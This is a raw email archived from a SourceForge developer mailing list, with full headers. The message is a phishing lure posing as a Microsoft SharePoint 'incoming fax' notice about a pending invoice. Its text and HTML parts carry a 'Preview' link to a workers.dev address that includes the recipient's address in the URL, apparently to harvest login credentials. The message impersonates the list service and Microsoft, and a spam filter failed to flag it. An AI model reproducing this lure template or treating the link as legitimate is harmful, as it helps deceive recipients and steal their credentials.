Return-Path: <industrypack-devel-bounces@lists.sourceforge.net>
X-Original-To: lists+industrypack-devel@lfdr.de
Delivered-To: lists+industrypack-devel@lfdr.de
Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
	by mail.lfdr.de (Postfix) with ESMTPS id 2ECF4888A95
	for <lists+industrypack-devel@lfdr.de>; Mon, 25 Mar 2024 04:23:11 +0100 (CET)
Received: from [127.0.0.1] (helo=sfs-ml-3.v29.lw.sourceforge.com)
	by sfs-ml-3.v29.lw.sourceforge.com with esmtp (Exim 4.95)
	(envelope-from <industrypack-devel-bounces@lists.sourceforge.net>)
	id 1roavV-0007Sj-JR
	for lists+industrypack-devel@lfdr.de;
	Mon, 25 Mar 2024 03:23:10 +0000
Received: from [172.30.20.202] (helo=mx.sourceforge.net)
 by sfs-ml-3.v29.lw.sourceforge.com with esmtps (TLS1.2) tls
 TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (Exim 4.95)
 (envelope-from <notification@cranewiehua.cam>) id 1roavT-0007Sb-Sb
 for industrypack-devel@lists.sourceforge.net;
 Mon, 25 Mar 2024 03:23:08 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=sourceforge.net; s=x; h=Message-Id:Date:Reply-To:MIME-Version:Content-Type:
 To:Subject:From:Sender:Cc:Content-Transfer-Encoding:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
 List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=kWfQsuwvL5POd0TMv0G3GD46cQauNnjKYuqf1D8L1v4=; b=YYSmnZeNWdjMvho+nNMjbZj5V0
 RkvjYz0DrNkl/1i3t+2PE6Jw3Z/VgmMEfDWvR8dfMHQvjJ4mrUTAIFnahF+mgolzquuaL4Tbn4kma
 e+7WDoAd6AdTFD3XVzRqnTgTdEgcjD+cEkIq88Ex241v/sTGrmlbOlyBxeLfywY6eEOw=;
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
 ;
 h=Message-Id:Date:Reply-To:MIME-Version:Content-Type:To:Subject:From:Sender
 :Cc:Content-Transfer-Encoding:Content-ID:Content-Description:Resent-Date:
 Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
 References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
 List-Owner:List-Archive; bh=kWfQsuwvL5POd0TMv0G3GD46cQauNnjKYuqf1D8L1v4=; b=H
 uO0einIJsE7mb8DJt8Z84fapiczxwopDGHkx/tkr3dpgeRVfQ2mZbYun1fmTjFAV2LC2l4rnIsDxL
 ze+a8iHFSuhd9Wz0/RH1prYy1VmJ19rOGV8VPF77jxv9eVZ/l2RtQm8fp7i38qjTh23jKS7IwlyVz
 XKnr4eVQCQjAQigw=;
Received: from mail.cranewiehua.cam ([93.185.167.61])
 by sfi-mx-2.v28.lw.sourceforge.com with esmtps
 (TLS1.2:ECDHE-RSA-AES256-GCM-SHA384:256) (Exim 4.95)
 id 1roavR-0007wz-1T for industrypack-devel@lists.sourceforge.net;
 Mon, 25 Mar 2024 03:23:08 +0000
Received: from WIN-BUNS25TD77J (unknown [108.165.237.105])
 by mail.cranewiehua.cam (Postfix) with ESMTPSA id 21BEC91CCB
 for <industrypack-devel@lists.sourceforge.net>;
 Mon, 25 Mar 2024 03:07:40 +0000 (UTC)
DKIM-Signature: v=1; a=rsa-sha256; c=simple/simple; d=cranewiehua.cam;
 s=202402; t=1711336060;
 bh=DD1Mv/7ECrAKtft1xu66Z7KuKuzWd7joyCXEO73wOHQ=;
 h=From:Subject:To:Reply-To:Date:From;
 b=0R7tGvJACkPB4I6TfDpWgeX5YoL5HRtknOjTDFuciV3DfvS87tj7QHDU1BaIhgbW5
 o2oPS6jOjERnSTFc3a0/8z4De4YZKRHpEPjDWm5HiU78Ovr+B5b/8ztEAl7nlsaRwp
 zzBpMFeT4Jt2MUtGZm8apDBFxt32WAIBrebYYRC8n37p6BBKalsZczpByOv5bcvcHx
 A14Uo47rGUsZG9Pzt2QOLsNt2A+1IoCML+vbxL2/wIjxky8IVpCNM34mWpPknSrNes
 +FFAK6vJ8dQuFbQf07Gq8apcugXgqsopRCBzNDUXemchl+waq68jbHj4sXwiwWLKpa
 iMR1RHbatgzbg==
From: "Notification from lists.sourceforge.net" <notification@cranewiehua.cam>
To: <industrypack-devel@lists.sourceforge.net>
MIME-Version: 1.0
Date: Sun, 24 Mar 2024 20:07:40 -0700
Message-Id: <20242403200739EE8A12E5E4-711086CB33@cranewiehua.cam>
X-Spam-Score: 1.1 (+)
X-Spam-Report: Spam detection software,
 running on the system "util-spamd-1.v13.lw.sourceforge.com", 
 has NOT identified this incoming email as spam.  The original
 message has been attached to this so you can view it or label
 similar future email.  If you have any questions, see
 the administrator of that system for details.
 Content preview: You have 1 new messages via Sharepoint. Dear
 industrypack-devel@lists.sourceforge.net:
 You have received 1 Incoming fax Document - lists.sourceforge.net Pending
 Invoice. Content analysis details:   (1.1 points, 6.0 required)
 pts rule name              description
 ---- ---------------------- --------------------------------------------------
 0.0 SPF_HELO_NONE          SPF: HELO does not publish an SPF Record
 1.3 RCVD_IN_VALIDITY_RPBL  RBL: Relay in Validity RPBL,
 https://senderscore.org/blocklistlookup/
 [93.185.167.61 listed in bl.score.senderscore.com]
 -0.0 SPF_PASS               SPF: sender matches SPF record
 0.0 HTML_MESSAGE           BODY: HTML included in message
 0.1 DKIM_SIGNED            Message has a DKIM or DK signature, not necessarily
 valid
 -0.1 DKIM_VALID_EF          Message has a valid DKIM or DK signature from
 envelope-from domain
 -0.1 DKIM_VALID_AU          Message has a valid DKIM or DK signature from
 author's domain
 -0.1 DKIM_VALID Message has at least one valid DKIM or DK signature
X-Headers-End: 1roavR-0007wz-1T
Subject: [Industrypack-devel] You have received Incoming fax Documents via
 Sharepoint
X-BeenThere: industrypack-devel@lists.sourceforge.net
X-Mailman-Version: 2.1.21
Precedence: list
List-Id: <industrypack-devel.lists.sourceforge.net>
List-Unsubscribe: <https://lists.sourceforge.net/lists/options/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=unsubscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=industrypack-devel>
List-Post: <mailto:industrypack-devel@lists.sourceforge.net>
List-Help: <mailto:industrypack-devel-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=subscribe>
Reply-To: notification.scan@lists.sourceforge.net
Content-Type: multipart/mixed; boundary="===============7856265316761324347=="
Errors-To: industrypack-devel-bounces@lists.sourceforge.net

This is a multi-part message in MIME format

--===============7856265316761324347==
Content-Type: multipart/alternative; boundary="mi5C2JqgmNOk8HK8O8Y=_PvnSMKlTeFjwB"

This is a multi-part message in MIME format

--mi5C2JqgmNOk8HK8O8Y=_PvnSMKlTeFjwB
Content-Type: text/plain; charset="utf-8"
Content-Transfer-Encoding: quoted-printable


You have 1 new messages via Sharepoint.

Dear industrypack-devel@lists.sourceforge.net:

You have received 1 Incoming fax Document - lists.sourceforge.net Pend=
ing Invoice.=20

RECEIVED : 3/24/2024

TRANSMIT TIME : 41 Sec.

Created By SharePoint Fax:

File Type : DOCX

Size : .09 KB

https://hello-world-black-meadow-72b5.histejoltu.workers.dev/px/QmVqUm=
MDesbNWp1KAWZXU9HczidFavxh5nBWuVBiHswsFq#industrypack-devel@lists.sour=
ceforge.net

Preview

Disclaimer: This email and any attachments are confidential and is add=
ressed to the recipient . If you have received this email in error ple=
ase notify the sender.

Email Security Powered by Microsoft Cloud

Copyright =C2=A9 2024 Microsoft Sharepoint. All rights reserved

--mi5C2JqgmNOk8HK8O8Y=_PvnSMKlTeFjwB
Content-Type: text/html; charset="utf-8"
Content-Transfer-Encoding: quoted-printable


<html><head>
<meta http-equiv=3D"Content-Type" content=3D"text/html; charset=3Dutf-=
8">
  <META content=3D"text/html; charset=3Dunicode" http-equiv=3DContent-=
Type><body<DIV><title>You have received Incoming fax Documents via Sha=
repoint</title>
 </head>
 <BODY> <P style=3D"FONT-FAMILY: ; TEXT-TRANSFORM: none; COLOR: rgb(0,=
0,0); LETTER-SPACING: normal; TEXT-INDENT: 0px"><BR class=3Dgmail-Appl=
e-interchange-newline>&nbsp;</P><table style=3D"FONT-SIZE: 14px; FONT-=
FAMILY: Roboto, sans-serif; WIDTH: 494px; WHITE-SPACE: normal; WORD-SP=
ACING: 0px; BORDER-COLLAPSE: collapse; TEXT-TRANSFORM: none; FONT-WEIG=
HT: 400; COLOR: rgb(44,54,58); FONT-STYLE: normal; TEXT-ALIGN: left; O=
RPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(25=
5,255,255); font-variant-ligatures: normal; font-variant-caps: normal;=
 -webkit-text-stroke-width: 0px; text-decoration-thickness: initial; t=
ext-decoration-style: initial; text-decoration-color: initial" cellSpa=
cing=3D0 cellPadding=3D5 border=3D0> <tr><td style=3D"FONT-FAMILY: Rob=
oto, RobotoDraft, Helvetica, Arial, sans-serif; PADDING-BOTTOM: 15px; =
PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px" =
colSpan=3D2><table style=3D"BORDER-COLLAPSE: collapse" cellSpacing=3D0=
 cellPadding=3D0 border=3D0> <TR align=3Dcenter> <TD style=3D"MAX-WIDT=
H: 416px; FONT-FAMILY: Roboto, RobotoDraft, Helvetica, Arial, sans-ser=
if; VERTICAL-ALIGN: middle; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PAD=
DING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px" align=3Dleft> <H2 sty=
le=3D"FONT-SIZE: 18px; FONT-FAMILY: Helvetica, Arial, sans-serif; FONT=
-WEIGHT: bold; COLOR: rgb(31,31,31); PADDING-BOTTOM: 4px; PADDING-TOP:=
 0px; PADDING-LEFT: 0px; MARGIN: 0px; LINE-HEIGHT: 23px; PADDING-RIGHT=
: 0px; BACKGROUND-COLOR: rgb(255,255,255)">You have 1 new messages via=
&nbsp;Sharepoint.<BR></H2></TD></TR></TABLE></TD></tr><tr><td style=3D=
"FONT-FAMILY: Roboto, RobotoDraft, Helvetica, Arial, sans-serif; MARGI=
N: 0px; PADDING-RIGHT: 15px" vAlign=3Dtop width=3D74 align=3Dright><BR=
></td><td style=3D"MAX-WIDTH: 416px; FONT-FAMILY: Roboto, RobotoDraft,=
 Helvetica, Arial, sans-serif; PADDING-BOTTOM: 20px; PADDING-TOP: 0px;=
 PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px" vAlign=3Dtop alig=
n=3Dleft> <H3 style=3D"FONT-SIZE: 14px; FONT-FAMILY: Helvetica, Arial,=
 sans-serif; FONT-WEIGHT: bold; COLOR: rgb(31,31,31); PADDING-BOTTOM: =
4px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; LINE-HEIGHT: 1.=
2; PADDING-RIGHT: 0px; BACKGROUND-COLOR: rgb(255,255,255)">Dear indust=
rypack-devel@lists.sourceforge.net:<BR></H3> <P style=3D"FONT-FAMILY: =
Helvetica, Arial, sans-serif; COLOR: rgb(125,125,125); PADDING-BOTTOM:=
 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; LINE-HEIGHT: 1=
6px; PADDING-RIGHT: 0px; BACKGROUND-COLOR: rgb(255,255,255)"><FONT siz=
e=3D2><BR></FONT>&nbsp;</p><p style=3D"FONT-FAMILY: Helvetica, Arial, =
sans-serif; FONT-WEIGHT: bold; COLOR: rgb(125,125,125); PADDING-BOTTOM=
: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; LINE-HEIGHT: =
16px; PADDING-RIGHT: 0px; BACKGROUND-COLOR: rgb(255,255,255)"><FONT st=
yle=3D"COLOR: black" size=3D2>You have received 1 Incoming fax Documen=
t</FONT><SPAN style=3D"COLOR: black">&nbsp;- lists.sourceforge.net&nbs=
p;Pending Invoice.</SPAN><FONT size=3D2><SPAN style=3D"COLOR: black">&=
nbsp;</SPAN><BR></FONT></p><p style=3D"FONT-FAMILY: Helvetica, Arial, =
sans-serif; COLOR: rgb(125,125,125); PADDING-BOTTOM: 0px; PADDING-TOP:=
 0px; PADDING-LEFT: 0px; MARGIN: 0px; LINE-HEIGHT: 16px; PADDING-RIGHT=
: 0px; BACKGROUND-COLOR: rgb(255,255,255)"><FONT size=3D2><BR></FONT><=
/p><p style=3D"FONT-FAMILY: Helvetica, Arial, sans-serif; COLOR: rgb(1=
25,125,125); PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px;=
 MARGIN: 0px; LINE-HEIGHT: 16px; PADDING-RIGHT: 0px; BACKGROUND-COLOR:=
 rgb(255,255,255)"><FONT size=3D2>RECEIVED : 3/24/2024</FONT></p><p st=
yle=3D"FONT-FAMILY: Helvetica, Arial, sans-serif; COLOR: rgb(125,125,1=
25); PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN:=
 0px; LINE-HEIGHT: 16px; PADDING-RIGHT: 0px; BACKGROUND-COLOR: rgb(255=
,255,255)"><FONT size=3D2><BR></FONT></p><p style=3D"FONT-FAMILY: Helv=
etica, Arial, sans-serif; COLOR: rgb(125,125,125); PADDING-BOTTOM: 0px=
; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; LINE-HEIGHT: 16px;=
 PADDING-RIGHT: 0px; BACKGROUND-COLOR: rgb(255,255,255)"><FONT size=3D=
2>TRANSMIT TIME : 41 Sec</FONT>.</P></TD></tr><tr><td style=3D"FONT-FA=
MILY: Roboto, RobotoDraft, Helvetica, Arial, sans-serif; MARGIN: 0px; =
PADDING-RIGHT: 15px" vAlign=3Dtop width=3D74 align=3Dright>&nbsp;</td>=
<td style=3D"MAX-WIDTH: 416px; FONT-FAMILY: Roboto, RobotoDraft, Helve=
tica, Arial, sans-serif; PADDING-BOTTOM: 10px; PADDING-TOP: 0px; PADDI=
NG-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px" vAlign=3Dtop align=3Dle=
ft> <H3 style=3D"FONT-SIZE: 14px; FONT-FAMILY: Helvetica, Arial, sans-=
serif; FONT-WEIGHT: bold; COLOR: rgb(31,31,31); PADDING-BOTTOM: 4px; P=
ADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; LINE-HEIGHT: 1.2; PAD=
DING-RIGHT: 0px; BACKGROUND-COLOR: rgb(255,255,255)">Created By&nbsp;S=
harePoint Fax:</H3> <P style=3D"FONT-SIZE: 14px; FONT-FAMILY: Helvetic=
a, Arial, sans-serif; FONT-WEIGHT: bold; COLOR: rgb(31,31,31); PADDING=
-BOTTOM: 4px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; LINE-H=
EIGHT: 1.2; PADDING-RIGHT: 0px; BACKGROUND-COLOR: rgb(255,255,255)">&n=
bsp;</p><p style=3D"FONT-FAMILY: Helvetica, Arial, sans-serif; COLOR: =
rgb(125,125,125); PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT:=
 0px; MARGIN: 0px; LINE-HEIGHT: 16px; PADDING-RIGHT: 0px; BACKGROUND-C=
OLOR: rgb(255,255,255)"><FONT size=3D2>File Type :&nbsp;DOCX</FONT></p=
><p style=3D"FONT-FAMILY: Helvetica, Arial, sans-serif; COLOR: rgb(125=
,125,125); PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; M=
ARGIN: 0px; LINE-HEIGHT: 16px; PADDING-RIGHT: 0px; BACKGROUND-COLOR: r=
gb(255,255,255)">&nbsp;</p><p style=3D"FONT-FAMILY: Helvetica, Arial, =
sans-serif; COLOR: rgb(125,125,125); PADDING-BOTTOM: 0px; PADDING-TOP:=
 0px; PADDING-LEFT: 0px; MARGIN: 0px; LINE-HEIGHT: 16px; PADDING-RIGHT=
: 0px; BACKGROUND-COLOR: rgb(255,255,255)"><FONT size=3D2>Size : .09 K=
B</FONT></P></TD></tr><tr><td style=3D"FONT-FAMILY: Roboto, RobotoDraf=
t, Helvetica, Arial, sans-serif; MARGIN: 0px" colSpan=3D2 align=3Dcent=
er> <P style=3D"FONT-SIZE: 12px; FONT-FAMILY: Helvetica, Arial, sans-s=
erif; COLOR: rgb(125,125,125); PADDING-BOTTOM: 0px; PADDING-TOP: 0px; =
PADDING-LEFT: 0px; MARGIN: 10px 0px; LINE-HEIGHT: 16px; PADDING-RIGHT:=
 0px"><SPAN style=3D"FONT-SIZE: 9pt; FONT-FAMILY: Helvetica, sans-seri=
f; COLOR: rgb(125,125,125)"><A style=3D"BORDER-TOP-STYLE: solid; FONT-=
SIZE: 16px; TEXT-DECORATION: none; BORDER-LEFT-STYLE: solid; HEIGHT: 5=
6px; BORDER-TOP-COLOR: rgb(0,120,212); WIDTH: 189px; BORDER-BOTTOM-STY=
LE: solid; BORDER-LEFT-COLOR: rgb(0,120,212); COLOR: rgb(255,255,255);=
 BORDER-BOTTOM-COLOR: rgb(0,120,212); TEXT-ALIGN: center; BORDER-RIGHT=
-STYLE: solid; BORDER-RIGHT-COLOR: rgb(0,120,212); LINE-HEIGHT: 40px; =
BACKGROUND-COLOR: rgb(0,120,212)" href=3D"https://hello-world-black-me=
adow-72b5.histejoltu.workers.dev/px/QmVqUmMDesbNWp1KAWZXU9HczidFavxh5n=
BWuVBiHswsFq#industrypack-devel@lists.sourceforge.net" rel=3D"noreferr=
er nofollow noopener" target=3D_blank> <P><B style=3D"FONT-WEIGHT: bol=
der">Preview</B></P></A></SPAN></TD></tr><tr><td style=3D"FONT-FAMILY:=
 Roboto, RobotoDraft, Helvetica, Arial, sans-serif; MARGIN: 0px" colSp=
an=3D2><table style=3D"FONT-SIZE: 12px; BORDER-COLLAPSE: collapse; PAD=
DING-BOTTOM: 10px; PADDING-TOP: 10px; PADDING-LEFT: 0px; PADDING-RIGHT=
: 0px" cellSpacing=3D0 cellPadding=3D0 width=3D"100%" border=3D0> <tr>=
<td style=3D"BORDER-TOP: rgb(221,221,221) 1px solid; FONT-FAMILY: Helv=
etica, Arial, sans-serif; BACKGROUND: rgb(255,255,255) 0% 50%; PADDING=
-BOTTOM: 0px; PADDING-TOP: 10px; PADDING-LEFT: 0px; MARGIN: 0px; PADDI=
NG-RIGHT: 0px" vAlign=3Dtop colSpan=3D2 align=3Dcenter>&nbsp;</TD></TR=
></TABLE></TD></tr><tr><td style=3D"FONT-FAMILY: Helvetica, Arial, san=
s-serif; BACKGROUND: rgb(255,255,255) 0% 50%; PADDING-BOTTOM: 0px; PAD=
DING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px" vAl=
ign=3Dtop colSpan=3D2 align=3Dcenter><table style=3D"BORDER-COLLAPSE: =
collapse" cellSpacing=3D0 cellPadding=3D0 bgColor=3D#ffffff border=3D0=
> <tr><td style=3D"FONT-FAMILY: Roboto, RobotoDraft, Helvetica, Arial,=
 sans-serif; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px;=
 MARGIN: 0px; PADDING-RIGHT: 0px" align=3Dleft> <P style=3D"FONT-SIZE:=
 11px; FONT-FAMILY: Helvetica, Arial, sans-serif; COLOR: rgb(125,125,1=
25); PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN:=
 10px 0px 18px; LINE-HEIGHT: 16px; PADDING-RIGHT: 0px"><B style=3D"FON=
T-WEIGHT: bolder">Disclaimer:</B>&nbsp;&nbsp; This email and any attac=
hments are confidential and&nbsp;is addressed to the recipient . If yo=
u have received this email in error please notify the sender.</P></TD>=
</TR></TABLE></TD></tr><tr><td style=3D"FONT-SIZE: 11px; BORDER-TOP: r=
gb(221,221,221) 1px solid; FONT-FAMILY: Helvetica, Arial, sans-serif; =
PADDING-BOTTOM: 5px; PADDING-TOP: 15px; PADDING-LEFT: 0px; MARGIN: 0px=
; PADDING-RIGHT: 0px" colSpan=3D2 align=3Dleft> <P style=3D"FONT-SIZE:=
 11px; FONT-FAMILY: Helvetica, Arial, sans-serif; COLOR: rgb(125,125,1=
25); MARGIN: 0px; LINE-HEIGHT: 13px">Email Security Powered by Microso=
ft Cloud</p><p style=3D"FONT-FAMILY: Helvetica, Arial, sans-serif; COL=
OR: rgb(125,125,125); MARGIN: 0px; LINE-HEIGHT: 13px">Copyright &copy;=
 2024 Microsoft Sharepoint. All rights reserved</P></TD></TR></TABLE><=
/body>
 </html>

--mi5C2JqgmNOk8HK8O8Y=_PvnSMKlTeFjwB--



--===============7856265316761324347==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline


--===============7856265316761324347==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
Industrypack-devel mailing list
Industrypack-devel@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/industrypack-devel

--===============7856265316761324347==--


